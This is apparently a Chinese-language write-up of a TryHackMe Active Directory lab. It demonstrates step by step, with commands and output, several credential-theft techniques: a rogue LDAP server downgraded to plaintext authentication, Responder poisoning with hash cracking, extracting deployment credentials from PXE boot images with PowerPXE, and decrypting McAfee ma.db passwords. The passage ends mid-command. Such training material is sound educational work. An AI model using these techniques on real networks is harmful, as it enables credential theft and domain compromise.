[any] 389 ...</span><br><span class="line">10.10.10.201: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765</span><br><span class="line">0?DC?;</span><br><span class="line">?</span><br><span class="line">?x</span><br><span class="line"> objectclass0?supportedCapabilities</span><br></pre></td></tr></table></figure><p>可能需要多次尝试才能收到连接，但它应该在 5 秒内做出响应。<code>supportedCapabilities </code>响应告诉我们有问题。本质上，在打印机发送凭据之前，它正在尝试协商 LDAP 身份验证方法详细信息。它将使用此协商来选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。如果身份验证方法太安全，凭据将不会以明文形式传输。对于某些身份验证方法，凭据根本不会通过网络传输！所以我们不能只使用普通的 Netcat 来获取凭据。我们需要创建一个恶意 LDAP 服务器并对其进行不安全的配置，以确保凭据以明文形式发送。</p><p><strong>托管恶意 LDAP 服务器</strong></p><p>有几种方法可以托管恶意 LDAP 服务器，但在本例中我们将使用 OpenLDAP。</p><p>使用以下命令安装 OpenLDAP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</span><br></pre></td></tr></table></figure><p>但是，您还必须在 AttackBox 上配置自己的恶意 LDAP 服务器。我们将首先使用以下命令重新配置 LDAP 服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure -p low slapd</span><br></pre></td></tr></table></figure><p>如果您想跳过服务器配置，请确保在请求时按&lt;否&gt;：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png" alt="img"></p><p>对于DNS域名，您需要提供我们的目标域，即<code>za.tryhackme.com</code>：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png" alt="img"></p><p>对组织名称也使用相同的名称：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png" alt="img"></p><p>提供任意管理员密码：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png" alt="img"></p><p>选择 MDB 作为要使用的 LDAP 数据库：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png" alt="img"></p><p>对于最后两个选项，请确保清除时不会删除数据库：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png" alt="img"></p><p>在创建新数据库文件之前移动旧数据库文件：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png" alt="img"></p><p>在使用恶意 LDAP 服务器之前，我们需要通过降级支持的身份验证机制使其易受攻击。我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。为此，我们需要创建一个新的 ldif 文件，其内容如下：</p><p>olcSaslSecProps.ldif</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#olcSaslSecProps.ldif</span><br><span class="line">dn: cn=config</span><br><span class="line">replace: olcSaslSecProps</span><br><span class="line">olcSaslSecProps: noanonymous,minssf=0,passcred</span><br></pre></td></tr></table></figure><p>该文件具有以下属性：</p><ul><li>**olcSaslSecProps：**指定 SASL 安全属性</li><li>**noanonymous：**禁用支持匿名登录的机制</li><li>**minssf：**指定可接受的最小安全强度，0 表示无保护。</li></ul><p>现在我们可以使用 ldif 文件来修补我们的 LDAP 服务器，方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</span><br></pre></td></tr></table></figure><p>我们可以使用以下命令验证我们的恶意 LDAP 服务器的配置是否已应用（<strong>注意</strong>：如果您使用的是 Kali，则可能不会收到任何输出，但配置应该已经起作用，您可以继续执行后续步骤）：</p><p>LDAP 搜索以验证支持的身份验证机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms</span><br><span class="line">dn:</span><br><span class="line">supportedSASLMechanisms: PLAIN</span><br><span class="line">supportedSASLMechanisms: LOGIN</span><br></pre></td></tr></table></figure><p><strong>捕获 LDAP 凭证</strong></p><p>我们的恶意 LDAP 服务器现已配置完毕。单击http://printer.za.tryhackme.com/settings.aspx上的“测试设置”时，身份验证将以明文形式进行。如果您正确配置了恶意 LDAP 服务器，并且它正在降低通信质量，您将收到以下错误：“此可分辨名称包含无效语法”。如果收到此错误，您可以使用 tcpdump 捕获凭据(也可以通过wireshark等捕获)，方法是使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">10:41:52.979933 IP 10.10.10.201.49834 &gt; 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76</span><br><span class="line">0x0000:  4500 0074 b08c 4000 8006 20e2 0a0a 0ac9  E..t..@.........</span><br><span class="line">0x0010:  0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2  ...9........BW..</span><br><span class="line">0x0020:  5018 2014 1382 0000 3084 0000 0046 0201  P.......0....F..</span><br><span class="line">0x0030:  0263 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........</span><br><span class="line">0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object</span><br><span class="line">0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup</span><br><span class="line">0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan</span><br><span class="line">0x0070:  6973 6d73                                isms</span><br><span class="line">10:41:52.979938 IP 10.10.10.57.ldap &gt; 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0</span><br><span class="line">0x0000:  4500 0028 247d 4000 4006 ed3d 0a0a 0a39  E..($&#125;@.@..=...9</span><br><span class="line">0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....&#x27;</span><br><span class="line">0x0020:  5010 01f6 2930 0000                      P...)0..</span><br><span class="line">10:41:52.980162 IP 10.10.10.57.ldap &gt; 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54</span><br><span class="line">0x0000:  4500 005e 247e 4000 4006 ed06 0a0a 0a39  E..^$~@.@......9</span><br><span class="line">0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....&#x27;</span><br><span class="line">0x0020:  5018 01f6 2966 0000 3034 0201 0264 2f04  P...)f..04...d/.</span><br><span class="line">0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported</span><br><span class="line">0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.</span><br><span class="line">0x0050:  0405 504c 4149 4e04 054c 4f47 494e       ..PLAIN..LOGIN</span><br><span class="line">[....]</span><br><span class="line">10:41:52.987145 IP 10.10.10.201.49835 &gt; 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0</span><br><span class="line">0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....</span><br><span class="line">0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-</span><br><span class="line">0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............</span><br><span class="line">10:41:52.989165 IP 10.10.10.201.49835 &gt; 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65</span><br><span class="line">0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........</span><br><span class="line">0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-</span><br><span class="line">0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..</span><br><span class="line">0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t</span><br><span class="line">0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc</span><br><span class="line">0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..password11</span><br></pre></td></tr></table></figure><p>4、<strong>身份验证中继</strong></p><p><strong>服务器消息块 (SMB)</strong></p><ul><li>由 Windows（和 Linux）系统使用，以促进文件共享、远程管理等。</li><li>SMB 协议的较新版本解决了一些漏洞，但拥有旧系统的公司仍在使用旧版本。</li><li>SMB 通信未加密，可以被拦截。</li></ul><p><strong>LLMNR、NBT-NS 和 WPAD</strong></p><ul><li>NBT-NS 和 LLMNR 是将主机名解析为 LAN 上的 IP 地址的方法。</li><li>WPAD 是 Windows 主机自动发现 Web 代理的一种方式。</li><li>这些协议在局域网上广播，因此可能被毒化，欺骗主机认为它们正在与预定目标对话。</li><li>由于这些是<strong>第 2 层</strong>协议，因此任何时候我们使用 Responder 捕获和毒害请求时，<strong>我们都必须与目标位于同一个 LAN 上</strong>。</li></ul><p><strong>使用Responder捕获哈希并破解</strong></p><p>运行 Responder 并等待客户端连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I breachad</span><br></pre></td></tr></table></figure><blockquote><p>breachad为Open VPN接口，我的为tun0</p></blockquote><p><a href="https://benheater.com/content/images/2022/08/image-23.png">Hash</a></p><p>可用<code>john</code>、<code>hashcat</code>等破解hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;svcFileCopy::ZA:7cc90fae8c5d340dx27; &gt; hash</span><br><span class="line">john --wordlist=./passwordlist.txt hash</span><br></pre></td></tr></table></figure><p>5、<strong>Microsoft部署工具包</strong></p><p>大型组织需要工具来部署和管理资产的基础设施。在大型组织中，您不能让 IT 人员使用 DVD 甚至 USB 闪存盘在每台机器上安装软件。幸运的是，Microsoft 已经提供了管理资产所需的工具。但是，我们可以利用这些工具中的错误配置来破坏AD。</p><p><strong>MDT 和 SCCM</strong></p><p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 ( OS )。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中心位置维护和更新基础映像。</p><p>通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。MDT 用于新部署。本质上，它允许 IT 团队预先配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需插入一根网线，一切就会自动发生。他们可以对启动映像进行各种更改，例如已经安装默认软件（如 Office365）和组织选择的防病毒软件。它还可以确保在第一次运行安装时更新新版本。</p><p>SCCM 几乎可以看作是 MDT 的扩展和老大哥。软件安装后会发生什么？SCCM 可以进行这种类型的补丁管理。它允许 IT 团队查看整个资产中安装的所有软件的可用更新。团队还可以在沙盒环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。它使 IT 团队的工作变得轻松很多。</p><p>然而，任何提供基础设施集中管理的东西，例如 MDT 和 SCCM，都可能成为攻击者的目标，他们试图接管房地产中的大部分关键功能。虽然 MDT 可以以各种方式配置，但对于这项任务，我们将专注于一种称为预启动执行环境 (PXE) 启动的配置。</p><p><strong>如果攻击者可以假装是网络上的 PXE 启动客户端并通过 DHCP 请求从 MDT 请求映像，那么攻击者可以在安装过程中和安装后从 PXE 映像中注入或抓取信息。</strong></p><p><strong>PXE 启动</strong></p><p>大型组织使用 PXE 启动来允许连接到网络的新设备通过网络连接直接加载和安装操作系统。MDT可用于创建、管理和托管 PXE 启动映像。PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示**：**</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png" alt="img">执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的：</p><ul><li>注入权限提升向量（例如本地管理员帐户），以便在 PXE 启动完成后获得操作系统的管理访问权限。</li><li>执行密码抓取攻击来恢复安装期间使用的AD凭据。</li></ul><p>在此任务中，我们将重点关注后者。我们将尝试在安装期间恢复与 MDT 服务关联的部署服务帐户，以进行此密码抓取攻击。此外，还有可能检索用于无人值守安装应用程序和服务的其他AD帐户。</p><p><strong>PXE 启动映像检索</strong></p><p>由于DHCP有点棘手，我们将绕过此攻击的初始步骤。我们将跳过尝试从DHCP请求 IP 和 PXE 启动预配置详细信息的部分。我们将手动执行此步骤中的其余攻击。</p><p>您通过DHCP收到的有关 PXE Boot 预配置的第一条信息是 MDT 服务器的 IP。在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。</p><p>您将收到的第二条信息是 BCD 文件的名称。这些文件存储了与不同类型架构的 PXE Boots 相关的信息。要检索此信息，您需要连接到此网站：<a href="http://pxeboot.za.tryhackme.com/">http://pxeboot.za.tryhackme.com</a>。它将列出各种 BCD 文件：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png" alt="img"></p><p>通常，您会使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。但是，为了节省时间，我们将重点介绍<strong>x64</strong>架构的 BCD 文件。复制并存储此文件的全名。在本练习的其余部分，我们将使用此名称占位符，<code>x64&#123;7B...B3&#125;.bcd</code>因为文件及其名称每天都由 MDT 重新生成。每次看到此占位符时，请记住将其替换为您的特定 BCD 文件名。</p><p>现在，从DHCP恢复了这些初始信息，我们可以枚举并检索 PXE 启动映像。我们将在接下来的几个步骤中使用 THMJMP1 上的SSH连接</p><p>为了确保网络的所有用户都可以使用SSH，请首先使用您的用户名创建一个文件夹，然后将 powerpxe repo 复制到此文件夹中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\THM&gt;cd Documents</span><br><span class="line">C:\Users\THM\Documents&gt; mkdir &lt;username&gt;</span><br><span class="line">C:\Users\THM\Documents&gt; copy C:\powerpxe &lt;username&gt;\</span><br><span class="line">C:\Users\THM\Documents\&gt; cd &lt;username&gt;</span><br></pre></td></tr></table></figure><p>我们需要执行的第一步是使用 TFTP 并下载我们的 BCD 文件以读取 MDT 服务器的配置。TFTP 比 FTP 稍微复杂一些，因为我们无法列出文件。相反，我们发送文件请求，服务器将通过 UDP 连接回我们以传输文件。因此，我们在指定文件和文件路径时需要准确。BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\THM\Documents\Am0&gt; tftp -i &lt;THMMDT IP&gt; GET &quot;\Tmp\x64&#123;39...28&#125;.bcd&quot; conf.bcd</span><br><span class="line">Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s</span><br></pre></td></tr></table></figure><p>现在恢复了 BCD 文件，我们将使用<a href="https://github.com/wavestone-cdt/powerpxe">powerpxe</a>读取其内容。Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但通常结果各不相同，因此最好采用手动方法。我们将使用powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置：</p><p>SSH命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\THM\Documents\Am0&gt; powershell -executionpolicy bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.   </span><br><span class="line"></span><br><span class="line">PS C:\Users\THM\Documents\am0&gt; Import-Module .\PowerPXE.ps1</span><br><span class="line">PS C:\Users\THM\Documents\am0&gt; $BCDFile = &quot;conf.bcd&quot;</span><br><span class="line">PS C:\Users\THM\Documents\am0&gt; Get-WimFile -bcdFile $BCDFile</span><br><span class="line">&gt;&gt; Parse the BCD file: conf.bcd</span><br><span class="line">&gt;&gt;&gt;&gt; Identify wim file : &lt;PXE Boot Image Location&gt;</span><br><span class="line">&lt;PXE Boot Image Location&gt;</span><br></pre></td></tr></table></figure><p>WIM 文件是 Windows 映像格式 (WIM) 中的可启动映像。现在我们有了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载此映像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\THM\Documents\am0&gt; tftp -i &lt;THMMDT IP&gt; GET &quot;&lt;PXE Boot Image Location&gt;&quot; pxeboot.wim</span><br><span class="line">Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s</span><br></pre></td></tr></table></figure><p><strong>从 PXE 启动映像恢复凭据</strong></p><p>现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。需要注意的是，我们可以发起各种攻击。我们可以注入本地管理员用户，这样我们在映像启动后就拥有管理员访问权限，我们可以安装映像以拥有加入域的机器。如果您有兴趣了解有关这些攻击的更多信息，可以阅读这篇<a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">文章</a>。本练习将重点介绍仅尝试窃取凭据的简单攻击。</p><p>再次，我们将使用 powerpxe 来恢复凭据，但您也可以通过提取图像并查找 bootstrap.ini 文件（这些类型的凭据通常存储在该文件中）手动执行此步骤。要使用 powerpxe 从引导文件中恢复凭据，请运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\THM\Documents\am0&gt; Get-FindCredentials -WimFile pxeboot.wim</span><br><span class="line">&gt;&gt; Open pxeboot.wim</span><br><span class="line">&gt;&gt;&gt;&gt; Finding Bootstrap.ini</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\THMMDT\MTDBuildLab$</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt;</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = ZA</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt;</span><br></pre></td></tr></table></figure><p>如您所见，powerpxe 能够恢复AD凭据。我们现在有另一组可以使用的AD凭据！</p><p>6、<strong>配置文件</strong></p><p>我们将在此网络中探索的最后一个枚举途径是配置文件。假设您足够幸运地造成了一次入侵，使您能够访问组织网络上的主机。在这种情况下，配置文件是尝试恢复AD凭据的绝佳途径。根据被入侵的主机，各种配置文件可能对枚举有价值：</p><ul><li>Web 应用程序配置文件</li><li>服务配置文件</li><li>注册表项</li><li>集中部署的应用程序</li></ul><p>可以使用多个枚举脚本（例如<a href="https://github.com/GhostPack/Seatbelt">Seatbelt ）</a>来自动执行此过程。</p><p><strong>配置文件凭证</strong></p><p>在此任务中，我们将重点介绍如何从集中部署的应用程序中恢复凭据。通常，这些应用程序在安装和执行阶段都需要一种方法来向域进行身份验证。此类应用程序的一个例子是 McAfee Enterprise Endpoint Security，组织可以将其用作安全的端点检测和响应工具。</p><p>McAfee 将安装期间用于重新连接到 Orchestrator 的凭据嵌入到名为 ma.db 的文件中。可以通过对主机的本地访问来检索和读取此数据库文件，以恢复关联的AD服务帐户。我们将再次使用THMJMP1 上的SSH访问权限进行此练习。</p><p>ma.db文件存储在固定位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">thm@THMJMP1 C:\Users\THM&gt;cd C:\ProgramData\McAfee\Agent\DB</span><br><span class="line">thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB&gt;dir</span><br><span class="line"> Volume in drive C is Windows 10</span><br><span class="line"> Volume Serial Number is 6A0F-AA0F</span><br><span class="line"></span><br><span class="line"> Directory of C:\ProgramData\McAfee\Agent\DB      </span><br><span class="line"></span><br><span class="line">03/05/2022  10:03 AM    &lt;DIR&gt;          .</span><br><span class="line">03/05/2022  10:03 AM    &lt;DIR&gt;          ..</span><br><span class="line">03/05/2022  10:03 AM           120,832 ma.db      </span><br><span class="line">               1 File(s)        120,832 bytes     </span><br><span class="line">               2 Dir(s)  39,426,285,568 bytes free</span><br></pre></td></tr></table></figure><p>我们可以使用 SCP 将 ma.db 复制到我们的 AttackBox：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .</span><br><span class="line">thm@10.200.4.249&#x27;s password:</span><br><span class="line">ma.db 100%  118KB 144.1KB/s   00:00</span><br></pre></td></tr></table></figure><p>要读取数据库文件，我们将使用名为 sqlitebrowser 的工具。我们可以使用以下命令打开数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thm@thm:# sqlitebrowser ma.db</span><br></pre></td></tr></table></figure><p>使用 <code>sqlite3</code>或sqlitebrowser，我们将选择浏览数据选项并关注 AGENT_REPOSITORIES 表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 ./ma.db</span><br><span class="line"></span><br><span class="line"># List the tables in the database</span><br><span class="line"># Note the AGENT_REPOSITORIES table we&#x27;re interested in</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">AGENT_CHILD              AGENT_PROXIES            MA_DATACHANNEL_MESSAGES</span><br><span class="line">AGENT_LOGS               AGENT_PROXY_CONFIG</span><br><span class="line">AGENT_PARENT             AGENT_REPOSITORIES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Dump the table schema</span><br><span class="line"># Note the column names</span><br><span class="line">    # NAME</span><br><span class="line">    # UNIQUE</span><br><span class="line">    # REPO_TYPE</span><br><span class="line">    # URL_TYPE</span><br><span class="line">    # NAMESPACE</span><br><span class="line">    # PROXY_USAGE</span><br><span class="line">    # AUTH_TYPE</span><br><span class="line">    # ENABLED</span><br><span class="line">    # SERVER_FQDN</span><br><span class="line">    # SERVER_IP</span><br><span class="line">    # SERVER_NAME</span><br><span class="line">    # PORT</span><br><span class="line">    # SSL_PORT</span><br><span class="line">    # DOMAIN</span><br><span class="line">    # AUTH_USER</span><br><span class="line">    # AUTH_PASSWD</span><br><span class="line">    # IS_PASSWD_ENCRYPTED</span><br><span class="line">    # PING_TIME</span><br><span class="line">    # SUBNET_DISTANCE</span><br><span class="line">    # SITELIST_ORDER</span><br><span class="line">    # STATE</span><br><span class="line">sqlite&gt; .schema AGENT_REPOSITORIES</span><br><span class="line">CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Select the desired columns from the table</span><br><span class="line">sqlite&gt; SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES;</span><br><span class="line">za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Exit sqlite3</span><br><span class="line">sqlite&gt; .quit</span><br></pre></td></tr></table></figure><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png" alt="img"></p><p>我们对第二个条目特别感兴趣，重点关注 DOMAIN、AUTH_USER 和 AUTH_PASSWD 字段条目。记下这些条目中存储的值。但是，AUTH_PASSWD 字段已加密。幸运的是，McAfee 使用已知密钥加密此字段。因此，我们将使用以<a href="https://github.com/funoverip/mcafee-sitelist-pwd-decryption">脚本</a>解密密码。</p><p>您必须解压缩 mcafee-sitelist-pwd-decryption.zip 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip</span><br></pre></td></tr></table></figure><p>通过向脚本提供我们的 base64 编码和加密的密码，脚本将提供解密的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py &lt;AUTH PASSWD VALUE&gt;</span><br><span class="line">Crypted password   : &lt;AUTH PASSWD VALUE&gt;</span><br><span class="line">Decrypted password : &lt;Decrypted Pasword&gt;</span><br></pre></td></tr></table></figure><h4 id="ad域枚举">AD域枚举</h4><p>在我们有了第一组有效的 Active Directory ( AD ) 凭据，我们将探索可用于枚举AD 的不同方法：</p><ul><li>Microsoft 管理控制台的AD管理单元</li><li>命令提示符的网络命令</li><li>PowerShell的 AD-RSAT cmdlet</li><li>Bloodhound</li></ul><p>对于ssh连接域内跳板机可使用如下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh za.tryhackme.com\\&lt;AD 